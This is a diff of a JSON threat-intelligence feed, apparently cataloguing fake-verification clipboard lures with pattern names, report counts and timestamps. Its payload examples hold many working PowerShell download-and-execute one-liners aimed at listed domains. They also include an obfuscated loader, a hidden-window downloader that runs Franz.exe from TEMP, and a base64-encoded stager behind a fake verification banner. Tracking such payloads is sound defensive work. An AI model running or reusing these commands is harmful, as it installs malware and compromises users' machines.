@@ -1,12 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 124,
-    "ReportCount": 124,
-    "FirstSeen": "2026-11-18T01:02:55.695000+00:00",
+    "DistinctPayloadCount": 123,
+    "ReportCount": 123,
+    "FirstSeen": "2026-11-18T04:11:27.895000+00:00",
     "LastSeen": "2026-11-24T20:34:48.651000+00:00",
     "ReportIds": [
-      "cmwlf35i01ikh0omllasbe9x1",
       "cmwlltm271k7m0omlj7e36c2f",
       "cmwlmowug1kew0omlj08cauyz",
       "cmwlmq1ua1kgi0oml2zjwrd4e",
@@ -144,7 +143,6 @@
       "irm 'browse-cloud.codes/336728d213008c22'|iex;",
       "irm 'browse-cloud.codes/336859a88717c5ae'|iex;",
       "irm 'browse-cloud.codes/3426c2223ed9c3e8'|iex;",
-      "irm 'browse-cloud.codes/354fef1345fed255'|iex;",
       "irm 'browse-cloud.codes/363f0a60339cdca1'|iex;",
       "irm 'browse-cloud.codes/3b1e84a691f0e630'|iex;",
       "irm 'browse-cloud.codes/3ecc4f43c6e077c1'|iex;",
@@ -260,14 +258,11 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 109,
-    "ReportCount": 109,
-    "FirstSeen": "2026-11-18T01:15:09.036000+00:00",
+    "DistinctPayloadCount": 106,
+    "ReportCount": 106,
+    "FirstSeen": "2026-11-18T03:01:45.293000+00:00",
     "LastSeen": "2026-11-24T20:57:34.237000+00:00",
     "ReportIds": [
-      "cmwlfivnr1ilb0omlg7jm24vm",
-      "cmwlfj2tz1img0omlarvww2vu",
-      "cmwlfjdna1inz0omlu82l8eee",
       "cmwljbytb1jwa0omlrmiaavfj",
       "cmwljnrpx1k140omlyyd1hsig",
       "cmwlk2b0m1k450omldyolyil5",
@@ -387,7 +382,6 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/125d0ae4c5f1e71b')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/14a3ad6bb4f6e2d5')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/1814f655616968c8')|iex",
-      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/1ab42bce486721d7')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/1bbd30f3bb143adb')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/28f40bc7d27ab2e5')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/2c3ea9f666a8162f')|iex",
@@ -420,7 +414,6 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/723cf4360f5743be')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/726c9954614c32dc')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/72a22e04bfde613c')|iex",
-      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/72f1e6202bcdac15')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/730b8a8195bd48f8')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/751686e33f3ab610')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/78f180f1af8aac40')|iex",
@@ -454,7 +447,6 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/bc80cbabe7050d7d')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/be2c68a812a3617a')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/c7d3869a7a1cb672')|iex",
-      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/cd42c370ba111a89')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d92b82024b5340a2')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d949f4f108fe9c12')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d9e2c158ed748001')|iex",
@@ -829,21 +821,6 @@
     ]
   },
   {
-    "Pattern": "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell...",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 3,
-    "FirstSeen": "2026-11-18T01:02:06.654000+00:00",
-    "LastSeen": "2026-11-24T18:22:42.950000+00:00",
-    "ReportIds": [
-      "cmwlf23n91ij10omln7rjkh67",
-      "cmwlf2lxn1ijq0omlk8itykij",
-      "cmwv0vfsi09qb0nmlg1r9m23j"
-    ],
-    "PayloadExamples": [
-      "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell..."
-    ]
-  },
-  {
     "Pattern": "powershell \"$o='i8-nkpIEex5Yv1sor';&($($u='';$OFS=$u;\"$($o[6,3,12,15,4,8,2,7,9,5,16,8,14,14,0,15,3])\")) $(&('Invoke-'+'RestMethod') cloudfiare.io/u)\"",
     "DistinctPayloadCount": 1,
     "ReportCount": 3,
@@ -887,20 +864,6 @@
     ]
   },
   {
-    "Pattern": "powershell -w h \"iex(irm \\'fingerprint-veri.info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 2,
-    "FirstSeen": "2026-11-18T01:01:43.475000+00:00",
-    "LastSeen": "2026-11-24T18:33:06.136000+00:00",
-    "ReportIds": [
-      "cmwlf1lre1ihg0omlt36wp1of",
-      "cmwv18snu0a6b0nmlpoa09xzd"
-    ],
-    "PayloadExamples": [
-      "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit"
-    ]
-  },
-  {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
     "ReportCount": 1,
@@ -911,6 +874,19 @@
     ],
     "PayloadExamples": [
       "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit"
+    ]
+  },
+  {
+    "Pattern": "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell...",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-24T18:22:42.950000+00:00",
+    "LastSeen": "2026-11-24T18:22:42.950000+00:00",
+    "ReportIds": [
+      "cmwv0vfsi09qb0nmlg1r9m23j"
+    ],
+    "PayloadExamples": [
+      "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell..."
     ]
   },
   {
@@ -989,6 +965,19 @@
     ],
     "PayloadExamples": [
       "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\"                                                                                                                                                              \necho \"\n  ____ _                 _  __ _\n / ___| | ___  _   _  __| |/ _| | __ _ _ __ ___\n| |   | |/ _ \\| | | |/ _  | |_| |/ _  |  __/ _ \\\n| |___| | (_) | |_| | (_| |  _| | (_| | | |  __/\n \\____|_|\\___/ \\__,_|\\__,_|_| |_|\\__,_|_|  \\___|\n\"`\n\nWrite-Output \"Initializing verification ...\"\nStart-Sleep -Milliseconds 608\n\n$updateloadUrl = 'cwBhAGwAIAB1AGEAZQB2ACAAKAAgAGcAYwBtACAAaQBlAHgAIAApADsAdQBhAGUAdgAoACAAaQB3AHIAIAAtAHUAcwBlAGIAYQBzACAAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAHkAbwB1AHIAZAByAGUAYQBtADEAOQA4ADgALwBhAHcAZQBzAG8AbQBlAC0AQwBoAGEAdABHAFAAVAAtAHIAZQBwAG8AcwBpAHQAbwByAGkAZQBzAC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBTAEUAQwBVAFIASQBUAFkALgBkAGEAdAAnACAAKQA='\n\n$bytes = [Convert]::FromBase64String($updateloadUrl)\n$clean = [Text.Encoding]::Unicode.GetString($bytes)\n\nStart-Sleep -Milliseconds 537\nWrite-Output \"Processing request ...\"\nStart-Sleep -Milliseconds 898\nWrite-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \"\nfor ($i = 0; $i -lt 5; $i++) {\n    Start-Sleep -Milliseconds 400\n    Write-Host -NoNewline \".\"\n}\nInvoke-Expression $clean"
+    ]
+  },
+  {
+    "Pattern": "powershell -w h \"iex(irm \\'fingerprint-veri.info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-24T18:33:06.136000+00:00",
+    "LastSeen": "2026-11-24T18:33:06.136000+00:00",
+    "ReportIds": [
+      "cmwv18snu0a6b0nmlpoa09xzd"
+    ],
+    "PayloadExamples": [
+      "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit"
     ]
   },
   {
